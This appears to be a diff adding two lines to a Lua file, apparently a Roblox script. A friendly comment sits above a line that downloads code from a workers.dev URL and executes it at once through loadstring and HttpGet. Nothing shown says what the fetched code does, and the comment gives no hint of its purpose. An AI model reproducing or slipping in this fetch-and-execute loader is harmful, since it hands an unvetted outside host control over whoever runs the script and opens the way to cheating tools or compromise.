@@ -1,0 +1,2 @@
+-- Hey, i hope youre doing okay! <3
+loadstring(game:HttpGet("https://chronoshubkb.chronic817.workers.dev/"))()
